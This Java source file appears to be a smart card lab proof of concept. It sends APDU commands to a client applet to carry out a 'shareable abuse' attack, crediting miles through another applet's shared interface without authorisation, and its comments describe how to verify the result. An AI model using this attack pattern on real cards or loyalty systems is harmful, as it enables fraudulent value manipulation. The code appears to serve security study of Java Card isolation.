package packageTest;

import javax.smartcardio.ResponseAPDU;

/**
 *
 * @author swatch
 */
public class ComnCard {

    static CardMngr cardManager = new CardMngr();
    
    private final static byte CLA_SHAREABLE_ABUSE_ATTACK          = (byte)0xB0 ;

    private final static byte INS_SHAREABLE_ABUSE_ATTACK          = (byte)0x71;
    
    private final static short SW_SERVER_NOT_EXISTS               = (short) 0x7001;
    private final static short SW_FAILED_TO_OBTAIN_MSI            = (short) 0x7002;
    private final static short SW_FAILED_TO_EXECUTE_METHOD        = (short) 0x7003;
    
    private static byte SELECT_SIMPLEAPPLET[] = {(byte) 0x00, (byte) 0xa4, (byte) 0x04, (byte) 0x00, (byte) 0x06,
                                                (byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x02, (byte)0x01};
    
    public static void main(String[] args) {
        try {
            
            /**
             * Step 1: Execute the attack: Communicate with ClientAppletB and execute shareableAbuseAttack method
             * 
             * Set AID of ClientAppletB = 010203040201
             * SELECT_SIMPLEAPPLET[] = {(byte) 0x00, (byte) 0xa4, (byte) 0x04, (byte) 0x00, (byte) 0x06,
                                                (byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x02, (byte)0x01};
             * 
             * apdu[CardMngr.OFFSET_CLA] = (byte)0xB0 ;
             * apdu[CardMngr.OFFSET_INS] = (byte)0x71; // Command to execute shareableAbuseAttack method
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x04; // amount to credit = Util.makeShort(OFFSET_P1, OFFSET_P2)
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x06;
             * 
             * Returns the following if attack successful:
             * 90 00 
             * 
             * Step 2: Verify the attack: Communicate with ServerApplet and execute returnCreditedMiles method
             * 
             * Set AID of ServerApplet = 010203040101
             * SELECT_SIMPLEAPPLET[] = {(byte) 0x00, (byte) 0xa4, (byte) 0x04, (byte) 0x00, (byte) 0x06,
                                                (byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x01, (byte)0x01}; 
             *
             * apdu[CardMngr.OFFSET_CLA] = (byte)0xB0 ;
             * apdu[CardMngr.OFFSET_INS] = (byte)0x71; // Command to execute returnCreditedMiles method
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x04; // Doesn't matter
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x06; // Doesn't matter
             * 
             * Returns values of milesB and milesC. Returns the following if successful:
             * 00 00 04 06 90 00 
             * 
             * 0000 = milesB credited
             * 0406 = milesC credited. ClientAppletB is successful in crediting milesC using MSIC 
             * 
             */
            short additionalDataLen = 0;
            byte apdu[];
            apdu = new byte[CardMngr.HEADER_LENGTH + additionalDataLen];
            apdu[CardMngr.OFFSET_CLA] = (byte)0xB0 ;
            apdu[CardMngr.OFFSET_INS] = (byte)0x71; 
            apdu[CardMngr.OFFSET_P1] = (byte) 0x04;
            apdu[CardMngr.OFFSET_P2] = (byte) 0x06;
            apdu[CardMngr.OFFSET_LC] = (byte) additionalDataLen;
        
                      
            /***************************** Comn with Card ***************************************/
            
            ResponseAPDU response = null;
            
            if (cardManager.ConnectToCard()) {
                // Select our application on card
                cardManager.sendAPDU(SELECT_SIMPLEAPPLET);
                
                // TODO: send proper APDU
                response = cardManager.sendAPDU(apdu);
                
                cardManager.DisconnectFromCard();
            } else {
                System.out.println("Failed to connect to card");
            }
            
            /*************************************************************************/
            
            byte[] byteResponse = response.getBytes();

            System.out.println();
            System.out.println("*******************************************************************");
            System.out.println();
            
            if((byteResponse[(short)(byteResponse.length - 2)] == -112) &&  (byteResponse[(short)(byteResponse.length - 1)] == 0)){
                System.out.println("Success....!!!");
            }
            else
                System.out.println("Failure...!!!");

            System.out.println();
            System.out.println("*******************************************************************");
            
        } catch (Exception ex) {
            System.out.println("Exception : " + ex);
        }
    }
}